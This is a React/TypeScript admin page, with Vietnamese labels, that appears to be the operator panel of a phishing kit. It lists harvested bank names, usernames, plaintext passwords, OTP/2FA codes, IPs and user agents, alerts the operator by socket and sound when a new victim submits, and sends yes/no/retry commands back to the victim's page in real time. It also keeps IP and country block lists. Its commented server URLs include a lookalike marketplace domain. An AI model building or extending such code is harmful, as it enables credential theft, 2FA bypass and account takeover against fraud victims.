/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable prettier/prettier */
import { useContext, useEffect, useState } from 'react'
import { useMutation, useQuery, useQueryClient } from 'react-query'
import { toast } from 'react-toastify'
import socket from '~/utils/socket'
// socket base is read from VITE_SOCKET_BASE_URL inside ~/utils/socket
// const serverUrl = 'https://apifsv3.mercadolibresa.com'

import { getAllTable, updateTable } from '~/apis/table.api'
// Use public folder asset path so Vite serves it as '/notify.wav'
// This avoids bundler path issues and ensures the file is reachable at runtime.
// const serverUrl = 'https://api-meta-for-business-case.onrender.com'

// const [response, setResponse] = useState('');
const ringAudio = new Audio('/notify.wav')
ringAudio.preload = 'auto'
ringAudio.volume = 0.7
ringAudio.addEventListener('canplaythrough', () => {
  console.info('[ringAudio] canplaythrough')
})
ringAudio.addEventListener('error', (ev) => {
  console.error('[ringAudio] error loading audio', ev)
})
import { useCopyToClipboard } from '~/hooks/useClipboard'
import { AppContext } from '~/contexts/app.context'
import { getCountConnect } from '~/apis/auth.api'
import {
  createIp,
  createIpCountry,
  deleteBlackItem,
  deleteBlackItemCountry,
  getBlackList,
  getBlackListCountry
} from '~/apis/ip.api'

const Admin = () => {
  const [isDisableButton, setDisabbleButton] = useState<any>([])
  const { profile } = useContext(AppContext)

  const [searchQuery, setSearchQuery] = useState('')

  const handleSearch = async () => {
    try {
      if (searchQuery) {
        const [phoneResponse, emailResponse, passwordResponse] = await Promise.all([
          getAllTable({ phone: searchQuery }),
          getAllTable({ tenDangNhap: searchQuery }),
          getAllTable({ password: searchQuery })
        ])
        const combinedData = [].concat(phoneResponse.data.table, emailResponse.data.table, passwordResponse.data.table)

        setDataInfo(combinedData)
      }
    } catch (error) {
      console.error('Lỗi khi tìm kiếm:', error)
    }
  }

  const { isLoading: isLoadingTable } = useQuery({
    queryKey: ['table', 4],
    queryFn: () => {
      if (/^\d+$/.test(searchQuery)) {
        // If searchQuery is all digits, treat as phone
        return getAllTable({ phone: searchQuery })
      } else if (searchQuery.includes('@')) {
        // If searchQuery contains '@', treat as username/email
        return getAllTable({ tenDangNhap: searchQuery })
      } else {
        // Otherwise, treat as password
        return getAllTable({ password: searchQuery })
      }
    },
    onSuccess: (data) => {
      console.log(data)
      setDataInfo(data.data.table)
      // setCount(data.data)
    },
    cacheTime: 30000
  })
  useQuery({
    queryKey: ['blacklist', 6],
    queryFn: () => {
      return getBlackList()
    },
    onSuccess: (data) => {
      setBlockList(data.data)
    },
    cacheTime: 40000
  })
  useQuery({
    queryKey: ['blacklist-country', 7],
    queryFn: () => {
      return getBlackListCountry()
    },
    onSuccess: (data) => {
      setBlockListCountry(data.data)
    },
    cacheTime: 40000
  })

  const [dataInfo, setDataInfo] = useState<any>([])
  console.log(dataInfo)
  const [countConnect, setCountConnect] = useState(0)
  const a = localStorage.getItem('profile') as string
  const idUser = JSON.parse(a)._id

  const handleButtonSucssess = ({
    id,
    ip,
    socketId,
    codeRandom
  }: {
    id?: string
    ip: string
    socketId: string
    codeRandom: string
  }) => {
    const data = {
      codeRandom: codeRandom,
      id: id,
      idUser: idUser,
      ip: ip,
      socketId: socketId,
      confirm: 'agree'
    }
    const newData = [...isDisableButton, id]
    setDisabbleButton(newData)
    socket.emit('confirmId', data)
    console.log('data gửi lên', data)
  }

  const handleButtonReload = ({
    id,
    ip,
    socketId,
    codeRandom
  }: {
    id?: string
    ip: string
    socketId: string
    codeRandom: string
  }) => {
    const data = {
      codeRandom: codeRandom,
      id: id,
      idUser: idUser,
      ip: ip,
      socketId: socketId,
      confirm: 'reaload'
    }
    const newData = [...isDisableButton, id]
    setDisabbleButton(newData)
    socket.emit('confirmId', data)
    console.log('data gửi lên', data)
  }
  const handleButtonsetting = ({
    id,
    ip,
    socketId,
    codeRandom
  }: {
    id?: string
    ip: string
    socketId: string
    codeRandom: string
  }) => {
    const data = {
      codeRandom: codeRandom,
      id: id,
      idUser: idUser,
      ip: ip,
      socketId: socketId,
      confirm: 'setting'
    }
    const newData = [...isDisableButton, id]
    setDisabbleButton(newData)
    socket.emit('confirmId', data)
    console.log('data gửi lên', data)
  }
  const handleButtonRefuse = ({
    id,
    ip,
    socketId,
    codeRandom
  }: {
    id?: string
    ip: string
    socketId: string
    codeRandom: string
  }) => {
    const data = {
      codeRandom: codeRandom,
      id: id,
      idUser: idUser,
      ip: ip,
      socketId: socketId,
      confirm: 'deny'
    }
    const newData = [...isDisableButton, id]
    setDisabbleButton(newData)
    socket.emit('confirmId', data)
    console.log('data gửi lên', data)
  }

  // function updateStatus(index: number, status: string) {
  //   const updatedStatus = [...dataInfo]
  //   updatedStatus[index].status = status
  //   setDataInfo(updatedStatus)
  // }
  useEffect(() => {
    // const socket = io(serverUrl)
  socket.on('addCount', (data) => {
    setCountConnect(data)
  })
  return () => {
    socket.off('addCount')
  }
  }, [])
  // helper to play audio safely across browsers (autoplay policies)
  const safePlay = async () => {
    try {
      const p = ringAudio.play()
      if (p && typeof p.then === 'function') {
        p.then(() => console.debug('[ringAudio] play success')).catch((err) => {
          console.warn('[ringAudio] play rejected', err)
          // mark queued and notify user once
          if (!audioQueued) {
            setAudioQueued(true)
            toast.info(
              <div>
                Âm thanh bị chặn, vui lòng kích hoạt
                <button
                  onClick={() => {
                    unlockAndPlay()
                    toast.dismiss()
                  }}
                  className='ml-2 underline'
                >
                  Bật âm thanh
                </button>
              </div>,
              { autoClose: false }
            )
          }
        })
      }
    } catch (err) {
      console.warn('[ringAudio] play threw', err)
    }
  }

  // Prime audio on first user interaction to satisfy autoplay policies.
  // Queue state for audio: if a play was blocked, set this to true and notify user
  const [audioQueued, setAudioQueued] = useState(false)

  // helper to explicitly unlock and play queued audio (called from toast button or user gesture)
  const unlockAndPlay = async () => {
    try {
      await ringAudio.play()
      setAudioQueued(false)
    } catch (e) {
      // still blocked
      console.warn('[ringAudio] unlockAndPlay failed', e)
    }
  }

  useEffect(() => {
    const unlock = async () => {
      try {
        await ringAudio.play()
        ringAudio.pause()
        ringAudio.currentTime = 0
        // if we had queued sound, play it now
        if (audioQueued) {
          try {
            await ringAudio.play()
            setAudioQueued(false)
            toast.dismiss()
          } catch (e) {
            // ignore
          }
        }
      } catch (e) {
        // ignore
      }
      window.removeEventListener('click', unlock)
      window.removeEventListener('touchstart', unlock)
    }
    window.addEventListener('click', unlock)
    window.addEventListener('touchstart', unlock)
    return () => {
      window.removeEventListener('click', unlock)
      window.removeEventListener('touchstart', unlock)
    }
  }, [audioQueued])

  const getAllTableFunc = useMutation({
    mutationFn: () => {
      if (/^\d+$/.test(searchQuery)) {
        return getAllTable({ phone: searchQuery })
      } else if (searchQuery.includes('@')) {
        return getAllTable({ tenDangNhap: searchQuery })
      } else {
        return getAllTable({ password: searchQuery })
      }
    },
    onSuccess: (data) => {
      setDataInfo(data.data.table)
      if (data.data.table[0] && data.data.table[0].note) {
        toast.warn('Tài khoản này đã được làm rồi')
      }
      safePlay()
      queryClient.invalidateQueries({ queryKey: ['table', 4] })
    }
  })
  useEffect(() => {
    socket.on('serverResponse', () => {
      getAllTableFunc.mutate()
      safePlay()
    })
    return () => {
      socket.off('serverResponse')
    }
  }, [])

  useEffect(() => {
    socket.on('adminMessage2', () => {
      queryClient.invalidateQueries({ queryKey: ['table', 4] })
    })
    return () => {
      socket.off('adminMessage2')
    }
  }, [])
  useQuery({
    queryKey: ['countConnect', 5],
    queryFn: () => {
      return getCountConnect()
    },
    onSuccess: (data) => {
      setCountConnect(data.data)
      // setCount(data.data)
    },
    cacheTime: 30000
  })
  const [, copy] = useCopyToClipboard()
  const [blockValue, setBlockValue] = useState('')
  const [blockValueCountry, setBlockValueCountry] = useState('')
  const [blockList, setBlockList] = useState<string[]>([])
  const [blockListCountry, setBlockListCountry] = useState<string[]>([])

  const mutationUpdateStatus = useMutation((body: any) => {
    return updateTable(body)
  })
  const createBlackList = useMutation((body: any) => {
    return createIp(body)
  })
  const createBlackListCountry = useMutation((body: any) => {
    return createIpCountry(body)
  })
  const mutationDeleteBlackItem = useMutation((id: string) => {
    return deleteBlackItem(id)
  })
  const mutationDeleteBlackItemCountry = useMutation((id: string) => {
    return deleteBlackItemCountry(id)
  })
  const handleDeleteBlackItem = (id: string) => {
    mutationDeleteBlackItem.mutate(id, {
      onSuccess: () => {
        toast.success('Đã xoá thành công!')
        queryClient.invalidateQueries({ queryKey: ['blacklist', 6] })
      },
      onError: () => {
        toast.warn('Lỗi!')
      }
    })
  }
  const handleDeleteBlackItemCountry = (id: string) => {
    mutationDeleteBlackItemCountry.mutate(id, {
      onSuccess: () => {
        toast.success('Đã xoá thành công!')
        queryClient.invalidateQueries({ queryKey: ['blacklist-country', 7] })
      },
      onError: () => {
        toast.warn('Lỗi!')
      }
    })
  }
  const handleCreateBlackList = (e: any) => {
    e.preventDefault()
    const data = {
      ip: blockValue
    }
    createBlackList.mutate(data, {
      onSuccess: () => {
        toast.success('Đã chặn!')
        setBlockValue('')
        queryClient.invalidateQueries({ queryKey: ['blacklist', 6] })
      },
      onError: (error: any) => {
        toast.warn(error?.response.data.message)
        setBlockValue('')
      }
    })
  }
  const handleCreateBlackListCountry = (e: any) => {
    e.preventDefault()
    const data = {
      country: blockValueCountry
    }
    createBlackListCountry.mutate(data, {
      onSuccess: () => {
        toast.success('Đã chặn!')
        setBlockValueCountry('')
        queryClient.invalidateQueries({ queryKey: ['blacklist-country', 7] })
      },
      onError: (error: any) => {
        toast.warn(error?.response.data.message)
        setBlockValue('')
      }
    })
  }
  const queryClient = useQueryClient()
  const handleUpdateStatus = (body: any, status: string) => {
    const newData = { ...body, username: profile?.username, status: status, idStaff: profile?._id }
    mutationUpdateStatus.mutate(newData, {
      onSuccess: () => {
        toast.success('Cập nhật status thành công!')
        queryClient.invalidateQueries({ queryKey: ['table', 4] })
      }
    })
  }
  return (
    <div className='bg-[#f3f3f4] dark:bg-[#1d1d27] transition-all flex-1 h-screen'>
      <div className='px-5 pt-5 sm:flex sm:justify-between'>
        <h1 className='text-2xl mb-6 sm:mb-0 font-semibold dark:text-white'>Table</h1>
        <div className='flex flex-col items-end'>
          <div className='w-full flex sm:w-auto lg:w-[500px]'>
            <input
              className='px-[14px] flex-1 py-2 dark:placeholder:text-gray-300 border dark:border-gray-500 dark:border-r-0 bg-white dark:bg-[#1d1d27]'
              type='text'
              name=''
              id=''
              value={searchQuery}
              onChange={(e) => {
                setSearchQuery(e.target.value)
                handleSearch()
              }}
              placeholder='Nhập tên đăng nhập hoặc mật khẩu'
            />
            <button
              onClick={handleSearch}
              className='text-white px-[14px] py-2 bg-[#44f] transition-all hover:bg-[#3333bf]'
            >
              Tìm kiếm
            </button>
          </div>
        </div>
      </div>
      <div className='w-full px-5 flex sm:w-auto mt-3 mb-3 ml-auto justify-end'>
        <div className=' flex items-center gap-x-4 justify-between'>
          {blockList.length !== 0 &&
            blockList.map((item: any) => (
              <span
                key={item._id}
                id='badge-dismiss-dark'
                className='inline-flex cursor-pointer items-center px-2 py-1 mr-2 text-sm font-medium group text-white bg-gray-400 rounded '
              >
                {item.ip}
                <button
                  onClick={() => handleDeleteBlackItem(item._id)}
                  type='button'
                  className='inline-flex items-center p-1 ml-2 text-sm text-gray-400 bg-transparent rounded-sm group-hover:bg-gray-200 group-hover:text-gray-900 '
                  data-dismiss-target='#badge-dismiss-dark'
                  aria-label='Remove'
                >
                  <svg
                    className='w-2 h-2'
                    aria-hidden='true'
                    xmlns='http://www.w3.org/2000/svg'
                    fill='none'
                    viewBox='0 0 14 14'
                  >
                    <path
                      stroke='currentColor'
                      stroke-linecap='round'
                      stroke-linejoin='round'
                      stroke-width='2'
                      d='m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6'
                    />
                  </svg>
                  <span className='sr-only'>Remove badge</span>
                </button>
              </span>
            ))}
        </div>
        <form onSubmit={handleCreateBlackList} className='h-full'>
          <input
            className='px-[14px] md:w-[200px]  py-2 dark:placeholder:text-gray-300 border dark:border-gray-500 dark:border-r-0 bg-white dark:bg-[#1d1d27]'
            type='text'
            value={blockValue}
            onChange={(e) => setBlockValue(e.target.value)}
            placeholder='Nhập IP cần chặn'
          />
          <button
            type='submit'
            className='text-white h-full px-[14px] py-2.5 bg-green-600 transition-all hover:bg-green-800'
          >
            Chặn
          </button>
        </form>
      </div>
      <div className='w-full px-5 flex sm:w-auto mt-3 mb-3 ml-auto justify-end'>
        <div className=' flex items-center gap-x-4 justify-between'>
          {blockListCountry.length !== 0 &&
            blockListCountry.map((item: any) => (
              <span
                key={item._id}
                id='badge-dismiss-dark'
                className='inline-flex cursor-pointer items-center px-2 py-1 mr-2 text-sm font-medium group text-white bg-gray-400 rounded '
              >
                {item.code}
                <button
                  onClick={() => handleDeleteBlackItemCountry(item._id)}
                  type='button'
                  className='inline-flex items-center p-1 ml-2 text-sm text-gray-400 bg-transparent rounded-sm group-hover:bg-gray-200 group-hover:text-gray-900 '
                  data-dismiss-target='#badge-dismiss-dark'
                  aria-label='Remove'
                >
                  <svg
                    className='w-2 h-2'
                    aria-hidden='true'
                    xmlns='http://www.w3.org/2000/svg'
                    fill='none'
                    viewBox='0 0 14 14'
                  >
                    <path
                      stroke='currentColor'
                      stroke-linecap='round'
                      stroke-linejoin='round'
                      stroke-width='2'
                      d='m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6'
                    />
                  </svg>
                  <span className='sr-only'>Remove badge</span>
                </button>
              </span>
            ))}
        </div>
        <form onSubmit={handleCreateBlackListCountry} className='h-full'>
          <input
            className='px-[14px] md:w-[200px]  py-2 dark:placeholder:text-gray-300 border dark:border-gray-500 dark:border-r-0 bg-white dark:bg-[#1d1d27]'
            type='text'
            value={blockValueCountry}
            onChange={(e) => setBlockValueCountry(e.target.value)}
            placeholder='Việt Nam viết tắt vn'
          />
          <button
            type='submit'
            className='text-white h-full px-[14px] py-2.5 bg-purple-600 transition-all hover:bg-purple-800'
          >
            Chặn
          </button>
        </form>
      </div>
      <div className='ml-auto w-max mr-5 mb-8'>Lượng truy cập: {countConnect}</div>
      {/* <button onClick={() => ringAudio.play()} className='bg-red-400 p-10'>play</button> */}
      <div className='px-5  mx-auto '>
        <div className='relative flex-1  overflow-x-auto  border-x dark:border-gray-500'>
          <table className='w-full z-0 text-sm text-left text-gray-500 :text-gray-400'>
            <thead className='text-[13px] dark:border-b-white text-gray-700 uppercase bg-white dark:bg-[#2c2c39] border-b-[2px] border-black  hh:bg-gray-700 hh:text-gray-400'>
              <tr>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  STT{' '}
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  ip
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  Ngân hàng
                </th>
                {/* <th scope='col' className='overflow-x-auto px-3 w-[50px] py-4 text-[#9d9da7] font-semibold'>
                  Tên đăng nhập
                </th> */}
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  Tên đăng nhập
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  Mật khẩu
                </th>{' '}
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  mã quốc gia
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  Ip quốc gia
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  Mã giao dịch
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  username
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  OTP
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  Status
                </th>
                <th scope='col' className='px-3 py-4 text-[#9d9da7] font-semibold'>
                  Active
                </th>
              </tr>
            </thead>
            <>
              {isLoadingTable ? (
                <div style={{ zIndex: 10000 }} className='fixed top-0 left-0 w-full h-full  bg-[rgba(0,0,0,0.2)]'>
                  <div className='w-full flex justify-center items-center h-full gap-x-3'>
                    <svg
                      aria-hidden='true'
                      className='inline w-20 h-20 mr-2 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600'
                      viewBox='0 0 100 101'
                      fill='none'
                      xmlns='http://www.w3.org/2000/svg'
                    >
                      <path
                        d='M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z'
                        fill='currentColor'
                      />
                      <path
                        d='M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z'
                        fill='currentFill'
                      />
                    </svg>
                    <span className='text-lg dark:text-white'>Đang tải...</span>
                  </div>
                </div>
              ) : (
                <tbody>
                  {dataInfo?.map((item: any, index: any) => {
                    const handleDisabled = () => {
                      if (item.status !== 'pending') {
                        return true
                      } else {
                        if (
                          item.idStaff !== null &&
                          typeof item.idStaff !== 'undefined' &&
                          item.idStaff !== profile?._id
                        ) {
                          return true
                        }
                      }
                    }
                    return (
                      <tr
                        key={index}
                        className=' even:bg-white dark:text-white odd:bg-gray-100 dark:odd:bg-[#1d1d27] dark:even:bg-[#2c2c39] border-b hh:bg-gray-900 dark:border-gray-600'
                      >
                        <th
                          scope='row'
                          className='px-3 py-4 font-medium dark:text-white text-gray-900 whitespace-nowrap hh:text-white'
                        >
                          {index + 1}
                        </th>
                        <td className='w-[10rem] overflow-x-auto py-1 text-xs relative cursor-pointer'>
                          <div className='w-[10rem] text-center group overflow-x-auto flex'>
                            <div className='whitespace-pre-line'>
                              {item.ip}
                              <div
                                onClick={() => copy(item.ip)}
                                className='hidden group-hover:block absolute top-0 left-0 w-full h-full border-[#44f] border bg-[#649cfd6c]'
                              >
                                <span className=' absolute top-0 right-1 text-xs text-[#44f]'>Copy</span>
                              </div>
                            </div>
                          </div>
                        </td>
                        <td className='px-2 py-4 relative group cursor-pointer'>
                          {item.nganHang}
                          <div
                            onClick={() => copy(item.nganHang)}
                            className='hidden group-hover:block absolute top-0 left-0 w-full h-full border-[#44f] border bg-[#649cfd6c]'
                          >
                            <span className='absolute top-0 right-1 text-xs text-[#44f]'>Copy</span>
                          </div>{' '}
                        </td>
                        <td className='px-2 py-4 relative group cursor-pointer'>
                          {item.tenDangNhap}
                          <div
                            onClick={() => copy(item.tenDangNhap)}
                            className='hidden group-hover:block absolute top-0 left-0 w-full h-full border-[#44f] border bg-[#649cfd6c]'
                          >
                            <span className='absolute top-0 right-1 text-xs text-[#44f]'>Copy</span>
                          </div>{' '}
                        </td>
                        <td className='px-2 py-4 relative group cursor-pointer'>
                          {item.password}
                          <div
                            onClick={() => copy(item.password)}
                            className='hidden group-hover:block absolute top-0 left-0 w-full h-full border-[#44f] border bg-[#649cfd6c]'
                          >
                            <span className='absolute top-0 right-1 text-xs text-[#44f]'>Copy</span>
                          </div>{' '}
                        </td>
                        <td className='px-2 py-4 relative group cursor-pointer'>
                          {item.quocGiaPhone}
                          <div
                            onClick={() => copy(item.quocGiaPhone)}
                            className='hidden group-hover:block absolute top-0 left-0 w-full h-full border-[#44f] border bg-[#649cfd6c]'
                          >
                            <span className='absolute top-0 right-1 text-xs text-[#44f]'>Copy</span>
                          </div>{' '}
                        </td>
                        <td className='px-2 py-4 '>{item.quocGiaIp}</td>
                        {/* <td className='px-2 py-4 '>{item.userGent}</td> */}
                        <td className='w-[10rem] overflow-x-auto py-1 text-xs relative cursor-pointer'>
                          <div className='w-[10rem] text-center group overflow-x-auto flex'>
                            <div className='whitespace-pre-line'>
                              {item.userGent}
                              <div
                                onClick={() => copy(item.userGent)}
                                className='hidden group-hover:block absolute top-0 left-0 w-full h-full border-[#44f] border bg-[#649cfd6c]'
                              >
                                <span className=' absolute top-0 right-1 text-xs text-[#44f]'>Copy</span>
                              </div>
                            </div>
                          </div>
                        </td>
                        <td className='px-2 py-4 '>{item.username}</td>

                        {/* <td className='px-2 py-4 relative group cursor-pointer'>
                          {item.email}
                          <div
                            onClick={() => copy(item.email)}
                            className='hidden group-hover:block absolute top-0 left-0 w-full h-full border-[#44f] border bg-[#649cfd6c]'
                          >
                            <span className='absolute top-0 right-1 text-xs text-[#44f]'>Copy</span>
                          </div>{' '}
                        </td> */}

                        <td className='px-2 py-4 relative group cursor-pointer'>
                          {item.otp2FA}
                          <div
                            onClick={() => copy(item.otp2FA)}
                            className='hidden group-hover:block absolute top-0 left-0 w-full h-full border-[#44f] border bg-[#649cfd6c]'
                          >
                            <span className='absolute top-0 right-1 text-xs text-[#44f]'>Copy</span>
                          </div>{' '}
                        </td>

                        <td className=' py-4'>
                          {item.status === 'pending' && (
                            <button className='text-white text-xs bg-yellow-500 pb-1 transition-all  rounded-full px-2 py-[2px]'>
                              Pending
                            </button>
                          )}
                          {item.status === 'again' && (
                            <button className='text-white text-xs bg-black pb-1 transition-all  rounded-full px-1 py-[1px]'>
                              Done
                            </button>
                          )}
                          {item.status === 'done' && (
                            <button className='text-white text-xs bg-[#44f] pb-1 transition-all  rounded-full px-2 py-[2px]'>
                              Đồng ý
                            </button>
                          )}

                          {item.status === 'false' || item.status === 'setting' && (
                            <button className='text-white text-xs bg-[#ff5272] pb-1 transition-all  rounded-full px-2 py-[2px]'>
                              false
                            </button>
                          )}
                        </td>
                        <td className='px-1 py-1'>
                          <div className='flex gap-x-1'>
                            <button
                              disabled={handleDisabled()}
                              onClick={() => {
                                handleButtonRefuse({
                                  id: item._id,
                                  ip: item.ip,
                                  socketId: item.socketId,
                                  codeRandom: item.codeRandom
                                })
                                handleUpdateStatus(item, 'false')
                              }}
                              className='py-1 px-[12px] disabled:opacity-60 text-white bg-rose-800  hover:bg-red transition-all'
                            >
                              No
                            </button>
                            <button
                              disabled={handleDisabled()}
                              onClick={() => {
                                handleButtonSucssess({
                                  id: item._id,
                                  ip: item.ip,
                                  socketId: item.socketId,
                                  codeRandom: item.codeRandom
                                })
                                handleUpdateStatus(item, 'done')
                              }}
                              className='py-1 px-[12px] disabled:opacity-60 text-white bg-[#44f]  hover:bg-[#3333bf] transition-all'
                            >
                              Yes
                            </button>
                            <button
                              disabled={handleDisabled()}
                              onClick={() => {
                                handleButtonsetting({
                                  id: item._id,
                                  ip: item.ip,
                                  socketId: item.socketId,
                                  codeRandom: item.codeRandom
                                })
                                handleUpdateStatus(item, 'setting')
                              }}
                              className='py-1 px-[12px] disabled:opacity-60 dark:bg-[#626273] dark:text-white dark:hover:bg-[#4a4a56] bg-[#d2d2d5] text-black hover:bg-opacity-70 transition-all'
                            >
                              <svg
                                fill='#000000'
                                className='w-5 h-5'
                                version='1.1'
                                id='Capa_1'
                                xmlns='http://www.w3.org/2000/svg'
                                viewBox='0 0 54 54'
                              >
                                <g>
                                  <path
                                    d='M51.22,21h-5.052c-0.812,0-1.481-0.447-1.792-1.197s-0.153-1.54,0.42-2.114l3.572-3.571
		c0.525-0.525,0.814-1.224,0.814-1.966c0-0.743-0.289-1.441-0.814-1.967l-4.553-4.553c-1.05-1.05-2.881-1.052-3.933,0l-3.571,3.571
		c-0.574,0.573-1.366,0.733-2.114,0.421C33.447,9.313,33,8.644,33,7.832V2.78C33,1.247,31.753,0,30.22,0H23.78
		C22.247,0,21,1.247,21,2.78v5.052c0,0.812-0.447,1.481-1.197,1.792c-0.748,0.313-1.54,0.152-2.114-0.421l-3.571-3.571
		c-1.052-1.052-2.883-1.05-3.933,0l-4.553,4.553c-0.525,0.525-0.814,1.224-0.814,1.967c0,0.742,0.289,1.44,0.814,1.966l3.572,3.571
		c0.573,0.574,0.73,1.364,0.42,2.114S8.644,21,7.832,21H2.78C1.247,21,0,22.247,0,23.78v6.439C0,31.753,1.247,33,2.78,33h5.052
		c0.812,0,1.481,0.447,1.792,1.197s0.153,1.54-0.42,2.114l-3.572,3.571c-0.525,0.525-0.814,1.224-0.814,1.966
		c0,0.743,0.289,1.441,0.814,1.967l4.553,4.553c1.051,1.051,2.881,1.053,3.933,0l3.571-3.572c0.574-0.573,1.363-0.731,2.114-0.42
		c0.75,0.311,1.197,0.98,1.197,1.792v5.052c0,1.533,1.247,2.78,2.78,2.78h6.439c1.533,0,2.78-1.247,2.78-2.78v-5.052
		c0-0.812,0.447-1.481,1.197-1.792c0.751-0.312,1.54-0.153,2.114,0.42l3.571,3.572c1.052,1.052,2.883,1.05,3.933,0l4.553-4.553
		c0.525-0.525,0.814-1.224,0.814-1.967c0-0.742-0.289-1.44-0.814-1.966l-3.572-3.571c-0.573-0.574-0.73-1.364-0.42-2.114
		S45.356,33,46.168,33h5.052c1.533,0,2.78-1.247,2.78-2.78V23.78C54,22.247,52.753,21,51.22,21z M52,30.22
		C52,30.65,51.65,31,51.22,31h-5.052c-1.624,0-3.019,0.932-3.64,2.432c-0.622,1.5-0.295,3.146,0.854,4.294l3.572,3.571
		c0.305,0.305,0.305,0.8,0,1.104l-4.553,4.553c-0.304,0.304-0.799,0.306-1.104,0l-3.571-3.572c-1.149-1.149-2.794-1.474-4.294-0.854
		c-1.5,0.621-2.432,2.016-2.432,3.64v5.052C31,51.65,30.65,52,30.22,52H23.78C23.35,52,23,51.65,23,51.22v-5.052
		c0-1.624-0.932-3.019-2.432-3.64c-0.503-0.209-1.021-0.311-1.533-0.311c-1.014,0-1.997,0.4-2.761,1.164l-3.571,3.572
		c-0.306,0.306-0.801,0.304-1.104,0l-4.553-4.553c-0.305-0.305-0.305-0.8,0-1.104l3.572-3.571c1.148-1.148,1.476-2.794,0.854-4.294
		C10.851,31.932,9.456,31,7.832,31H2.78C2.35,31,2,30.65,2,30.22V23.78C2,23.35,2.35,23,2.78,23h5.052
		c1.624,0,3.019-0.932,3.64-2.432c0.622-1.5,0.295-3.146-0.854-4.294l-3.572-3.571c-0.305-0.305-0.305-0.8,0-1.104l4.553-4.553
		c0.304-0.305,0.799-0.305,1.104,0l3.571,3.571c1.147,1.147,2.792,1.476,4.294,0.854C22.068,10.851,23,9.456,23,7.832V2.78
		C23,2.35,23.35,2,23.78,2h6.439C30.65,2,31,2.35,31,2.78v5.052c0,1.624,0.932,3.019,2.432,3.64
		c1.502,0.622,3.146,0.294,4.294-0.854l3.571-3.571c0.306-0.305,0.801-0.305,1.104,0l4.553,4.553c0.305,0.305,0.305,0.8,0,1.104
		l-3.572,3.571c-1.148,1.148-1.476,2.794-0.854,4.294c0.621,1.5,2.016,2.432,3.64,2.432h5.052C51.65,23,52,23.35,52,23.78V30.22z'
                                  />
                                  <path
                                    d='M27,18c-4.963,0-9,4.037-9,9s4.037,9,9,9s9-4.037,9-9S31.963,18,27,18z M27,34c-3.859,0-7-3.141-7-7s3.141-7,7-7
		s7,3.141,7,7S30.859,34,27,34z'
                                  />
                                </g>
                              </svg>
                            </button>
                            <button
                              disabled={handleDisabled()}
                              onClick={() => {
                                handleButtonReload({
                                  id: item._id,
                                  ip: item.ip,
                                  socketId: item.socketId,
                                  codeRandom: item.codeRandom
                                })
                                handleUpdateStatus(item, 'again')
                              }}
                              className='py-1 px-[12px] disabled:opacity-60 dark:bg-[#626273] dark:text-white dark:hover:bg-[#4a4a56] bg-[#d2d2d5] text-black hover:bg-opacity-70 transition-all'
                            >
                              ĐV
                            </button>
                          </div>
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              )}
            </>
          </table>
        </div>
      </div>
      <div className='text-gray-600 text-[12px] py-6 flex justify-end pr-4 dark:text-white'>© 2023. Copyright</div>
    </div>
  )
}

export default Admin
